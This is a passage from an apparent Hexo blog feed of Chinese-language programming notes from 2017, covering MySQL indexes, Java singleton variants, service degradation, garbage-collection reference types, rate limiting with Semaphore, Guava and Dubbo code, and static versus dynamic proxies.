      
    </entry>
    
    
    
    <entry>
      <title>MySQL索引</title>
      <link href="/2017/05/05/MySQL%E7%B4%A2%E5%BC%95/"/>
      <url>/2017/05/05/MySQL%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://blog.csdn.net/kaka1121/article/details/53395628">MYSQL 索引类型、什么情况下用不上索引、什么情况下不推荐使用索引</a></li><li><a href="http://www.cnblogs.com/xiaoboluo768/p/5400990.html">mysql explain的使用</a></li><li><a href="http://blog.csdn.net/zhuxineli/article/details/14455029">MYSQL explain详解</a></li><li><a href="https://tech.meituan.com/mysql-index.html">MySQL索引原理及慢查询优化</a></li></ul><p>索引的类型有四种：</p><ul><li>普通索引</li><li>唯一索引</li><li>主键索引</li><li>组合索引</li></ul><p>关键词：组合索引的<strong>最左前缀</strong>原则</p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式之适配器模式</title>
      <link href="/2017/04/29/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/"/>
      <url>/2017/04/29/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1>]]></content>
      
      
      <categories>
          
          <category> Design Pattern </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 适配器模式 </tag>
            
            <tag> Adapter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式之单例模式</title>
      <link href="/2017/04/29/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
      <url>/2017/04/29/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1><p>这个类被创建后，只能产生一个实例供外部访问，并且提供一个全局的访问点。</p><p>设计上一般遵循这三点：</p><ul><li>将采用单例模式的类的构造方法私有化（采用private修饰）</li><li>在其内部产生该类的实例化对象，并将其封装成private static类型</li><li>定义一个静态方法返回该类的实例</li></ul><span id="more"></span><h3 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 饿汉式</span></span><br><span class="line"><span class="comment"> * 优点：线程安全、效率比较低、不存在线程同步问题、也不会加synchronized导致性能问题</span></span><br><span class="line"><span class="comment"> * 缺点：当类SingletonTest被加载的时候，会初始化static的instance，静态变量被创建并分配内存空间，从这以后，这个static的instance对象便一直占着这段内存（即便你还没有用到这个实例），当类被卸载时，静态变量被摧毁，并释放所占有的内存，因此在某些特定条件下会耗费内存 </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest</span> &#123;  </span><br><span class="line">    <span class="comment">// 私有构造方法、防止通过new SingletonTest()实例化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SingletonTest</span><span class="params">()</span> &#123;&#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将自身的实例对象设置为一个属性，并加上Static和final修饰符</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">SingletonTest</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingletonTest</span>();  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态方法返回该类的实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SingletonTest <span class="title function_">getInstance</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> instance;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="饱汉式"><a href="#饱汉式" class="headerlink" title="饱汉式"></a>饱汉式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 饱汉式</span></span><br><span class="line"><span class="comment"> * 非线程安全   </span></span><br><span class="line"><span class="comment"> * 优点是：写起来比较简单，当类SingletonTest被加载的时候，静态变量static的instance未被创建并分配内存空间，当getInstance方法第一次被调用时，初始化instance变量，并分配内存，因此在某些特定条件下会节约了内存；</span></span><br><span class="line"><span class="comment"> * 缺点是：并发环境下很可能出现多个SingletonTest实例。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SingletonTest</span><span class="params">()</span> &#123;&#125;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SingletonTest instance;   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态方法，调用时初始化，多线程访问时，可能造成重复初始化问题</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SingletonTest <span class="title function_">getInstance</span><span class="params">()</span> &#123;   </span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>)   </span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">SingletonTest</span>();   </span><br><span class="line">        <span class="keyword">return</span> instance;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="饱汉式-线程安全实现"><a href="#饱汉式-线程安全实现" class="headerlink" title="饱汉式 + 线程安全实现"></a>饱汉式 + 线程安全实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 饱汉式 + 线程安全实现   </span></span><br><span class="line"><span class="comment"> * 优点：使用synchronized关键字避免多线程访问时，出现多个SingletonTest实例。</span></span><br><span class="line"><span class="comment"> * 缺点是：同步方法频繁调用时，效率低</span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SingletonTest</span><span class="params">()</span> &#123;&#125;   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个SingletonTest类型的变量（不初始化，注意这里没有使用final关键字）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SingletonTest instance;   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态方法、调用时再初始化，使用synchronized避免多线程访问</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> SingletonTest <span class="title function_">getInstance</span><span class="params">()</span> &#123;   </span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>)   </span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">SingletonTest</span>();   </span><br><span class="line">        <span class="keyword">return</span> instance;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线程安全-效率高"><a href="#线程安全-效率高" class="headerlink" title="线程安全 + 效率高"></a>线程安全 + 效率高</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 线程安全 + 效率高    </span></span><br><span class="line"><span class="comment"> * 优点：内存占用少，效率高，线程安全，多线程操作原子性</span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest</span> &#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SingletonTest</span><span class="params">()</span> &#123;&#125;   </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//volatile保证了多线程访问时instance变量的可见性，避免了instance初始化时其他变量属性还没赋值完时，被另外线程调用</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> SingletonTest instance;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SingletonTest <span class="title function_">getIstance</span><span class="params">()</span> &#123; </span><br><span class="line">        <span class="comment">// 对象实例化时与否判断（不使用同步代码块，instance不等于null时，直接返回对象，提高运行效率）</span></span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//对象未初始化时，使用同步代码块，保证多线程访问时对象在第一次创建后，不再重复被创建</span></span><br><span class="line">            <span class="keyword">synchronized</span> (SingletonTest.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">SingletonTest</span>();   </span><br><span class="line">                &#125;   </span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="keyword">return</span> instance;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Design Pattern </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 单例模式 </tag>
            
            <tag> Singleton </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高并发之服务降级</title>
      <link href="/2017/04/29/%E9%AB%98%E5%B9%B6%E5%8F%91%E4%B9%8B%E6%9C%8D%E5%8A%A1%E9%99%8D%E7%BA%A7/"/>
      <url>/2017/04/29/%E9%AB%98%E5%B9%B6%E5%8F%91%E4%B9%8B%E6%9C%8D%E5%8A%A1%E9%99%8D%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<p>降级，也就是丢车保帅，不是直接挂掉。当然对用户来讲是有损服务，不过总比拒绝服务好。</p><p>通常降级的策略需要根据自己的场景来设计相应的策略。</p><p>降级有手动降级和自动降级的区别，不过这不是重点。</p><p>都是一些策略上的东西，可以参考下面的文章，写的很全面。</p><ul><li><a href="http://blog.csdn.net/enweitech/article/details/52061126">高并发系统的降级特技</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 并发编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>垃圾收集算法</title>
      <link href="/2017/04/28/%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E7%AE%97%E6%B3%95/"/>
      <url>/2017/04/28/%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>GC 注意考虑这些问题：</p><ul><li>哪些内存需要回收？</li><li>什么时候回收？</li><li>如何回收？</li></ul><h3 id="对象“存活”判定算法"><a href="#对象“存活”判定算法" class="headerlink" title="对象“存活”判定算法"></a>对象“存活”判定算法</h3><h4 id="引用计数算法"><a href="#引用计数算法" class="headerlink" title="引用计数算法"></a>引用计数算法</h4><p>原理：给对象中添加一个引用计数器，每当有一个地方引用它时，计数器加 1；引用失效时，计数器减 1；任何时刻计数器为 0 的对象就是不可能再被使用的。</p><p>缺点：很难解决对象相互循环引用的问题（两个对象相互循环引用，但其实他们都已经没有用了）。</p><h4 id="可达性分析算法"><a href="#可达性分析算法" class="headerlink" title="可达性分析算法"></a>可达性分析算法</h4><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>无论是通过引用计数算法判断对象的引用数量，还是通过可达性分析算法判断对象的引用链是否可达，判定对象是否存活都与“引用”有关。</p><ul><li>强引用（Strong Reference）</li><li>软引用（Soft Reference）</li><li>弱引用（Weak Reference）</li><li>虚引用（Phantom Reference）</li></ul><p>强引用， <code>Object object = new Object()</code> 这类的引用，只要强引用还存在，垃圾收集器永远不会回收掉被引用的对象。</p><p>软引用是用来描述一些还在用但并非必需的对象。对于软引用关联着的对象，在系统将要发生内存溢出异常之前，将会把这些对象列进回收范围之中进行第二次回收，如果这次回收完成还没有足够的内存，才会抛出内存溢出异常。在 JDK1.2 之后，提供了 SoftReference 类来实现软引用。</p><p>弱引用也是用来描述非必需对象的，但是它的强度比软引用要更弱一些，被弱引用关联的对象只能生存到下一次垃圾收集发生之前。当垃圾收集器工作时，无论当前内存是否足够，都会回收掉只被弱引用关联的对象。在 JDK1.2 之后，提供了 WeakReference 类来实现弱引用。</p><p>虚引用也称为幽灵引用或者幻影引用，它是最弱的一种引用关系。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例。为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知。在 JDK1.2 之后，提供了 PhantomReference 类来实现虚引用。</p><p><a href="http://blog.csdn.net/top_code/article/details/51289452">http://blog.csdn.net/top_code&#x2F;article&#x2F;details&#x2F;51289452</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高并发之限流</title>
      <link href="/2017/04/25/%E9%AB%98%E5%B9%B6%E5%8F%91%E4%B9%8B%E9%99%90%E6%B5%81/"/>
      <url>/2017/04/25/%E9%AB%98%E5%B9%B6%E5%8F%91%E4%B9%8B%E9%99%90%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<h3 id="背景描述"><a href="#背景描述" class="headerlink" title="背景描述"></a>背景描述</h3><p>系统在设计之初就会有一个预估容量，长时间超过系统能承受的TPS&#x2F;QPS阈值，系统可能会被压垮，最终导致整个服务不够用。为了避免这种情况，我们就需要对接口请求进行限流。 </p><p>当然，先压力测试后给一个容量可能会更好。</p><span id="more"></span><p>限流的目的是通过对并发访问请求进行限速，或者一个时间窗口内的的请求数量进行限速，来保护系统，一旦达到阈值则可以拒绝服务、排队或等待。 </p><p>常见的限流模式有控制并发和控制速率，一个是限制并发的数量，一个是限制并发访问的速率，另外还可以限制单位时间窗口内的请求数量。</p><h4 id="控制并发数量"><a href="#控制并发数量" class="headerlink" title="控制并发数量"></a>控制并发数量</h4><p>属于一种较常见的限流手段，在实际应用中可以通过信号量机制（如Java中的 <code>Semaphore</code> ）来实现。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chinaroad.monitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Semaphore;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSemaphore</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">executor</span> <span class="operator">=</span> Executors.newCachedThreadPool();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Semaphore</span> <span class="variable">semp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; <span class="number">100</span>; index++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">finalIndex</span> <span class="operator">=</span> index;</span><br><span class="line">            executor.execute(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    semp.acquire();</span><br><span class="line">                    System.out.println(<span class="string">&quot;Accessing Current: &quot;</span> + finalIndex);</span><br><span class="line">                    Thread.sleep((<span class="type">long</span>) (Math.random() * <span class="number">1000</span>));</span><br><span class="line">                    System.out.println(<span class="string">&quot;Available Permits:&quot;</span> + semp.availablePermits());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    semp.release();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        executor.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="控制访问速率"><a href="#控制访问速率" class="headerlink" title="控制访问速率"></a>控制访问速率</h4><ul><li>每过 <code>1 / r</code> 秒桶中增加一个令牌</li><li>桶中最多存放 <code>b</code> 个令牌，如果桶满了，新放入的令牌会被丢弃</li><li>当一个 <code>n</code> 字节的数据包到达时，消耗 <code>n</code> 个令牌，然后发送该数据包</li><li>如果桶中可用令牌小于 <code>n</code>，则该数据包将被缓存或丢弃</li></ul><p>Guava中的 <code>Ratelimiter</code> 可以来做。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//速率是每秒两个许可</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">RateLimiter</span> <span class="variable">rateLimiter</span> <span class="operator">=</span> RateLimiter.create(<span class="number">2.0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">submitTasks</span><span class="params">(List tasks, Executor executor)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (Runnable task : tasks) &#123;</span><br><span class="line">        rateLimiter.acquire(); <span class="comment">// 也许需要等待</span></span><br><span class="line">        executor.execute(task);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="控制单位时间窗口内请求数"><a href="#控制单位时间窗口内请求数" class="headerlink" title="控制单位时间窗口内请求数"></a>控制单位时间窗口内请求数</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alibaba.dubbo.rpc.filter.tps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.common.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StatItem</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> lastResetTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> interval;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> AtomicInteger token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> rate;</span><br><span class="line"></span><br><span class="line">    StatItem(String name, <span class="type">int</span> rate, <span class="type">long</span> interval) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.rate = rate;</span><br><span class="line">        <span class="built_in">this</span>.interval = interval;</span><br><span class="line">        <span class="built_in">this</span>.lastResetTime = System.currentTimeMillis();</span><br><span class="line">        <span class="built_in">this</span>.token = <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(rate);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAllowable</span><span class="params">(URL url, Invocation invocation)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">now</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">if</span> (now &gt; lastResetTime + interval) &#123;</span><br><span class="line">            token.set(rate);</span><br><span class="line">            lastResetTime = now;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> token.get();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span> (value &gt; <span class="number">0</span> &amp;&amp; !flag) &#123;</span><br><span class="line">            flag = token.compareAndSet(value, value - <span class="number">1</span>);</span><br><span class="line">            value = token.get();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getLastResetTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> lastResetTime;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="title function_">getToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> token.get();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">32</span>).append(<span class="string">&quot;StatItem &quot;</span>)</span><br><span class="line">            .append(<span class="string">&quot;[name=&quot;</span>).append(name).append(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">            .append(<span class="string">&quot;rate = &quot;</span>).append(rate).append(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">            .append(<span class="string">&quot;interval = &quot;</span>).append(interval).append(<span class="string">&quot;]&quot;</span>)</span><br><span class="line">            .toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 并发编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态代理、静态代理</title>
      <link href="/2017/03/07/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E3%80%81%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>/2017/03/07/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E3%80%81%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://www.cnblogs.com/V1haoge/p/5860749.html">java静态代理与动态代理简单分析</a></li><li><a href="http://www.ibm.com/developerworks/cn/java/j-lo-proxy1/">Java 动态代理机制分析及扩展，第 1 部分</a></li><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-proxy2/">Java 动态代理机制分析及扩展，第 2 部分</a></li><li><a href="http://blog.csdn.net/hintcnuie/article/details/10954631">动态代理proxy与CGLib的区别</a></li></ul><p>静态代理就是通过接口和类来实现的普通的代理模式。在代理类、委托类运行之前，代理类已经以<code>.class</code>的格式存在。静态代理共有三个角色，接口、委托类（真正实现类，含业务逻辑）、代理类（内部存在委托人的实例）。</p><p>动态代理是在程序运行时，由反射机制动态创建而成。</p><p>在Java中要想实现动态代理机制，需要两个类的支持。<code>java.lang.reflect.InvocationHandler</code> 和 <code>java.lang.reflect.Proxy</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Object proxy:被代理的对象</span></span><br><span class="line"><span class="comment"> * Method method:要调用的方法</span></span><br><span class="line"><span class="comment"> * Object[] args:方法调用时所需要参数</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chinaroad.proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** HelloWorld **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** HelloWorldImpl **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorldImpl</span> <span class="keyword">implements</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight 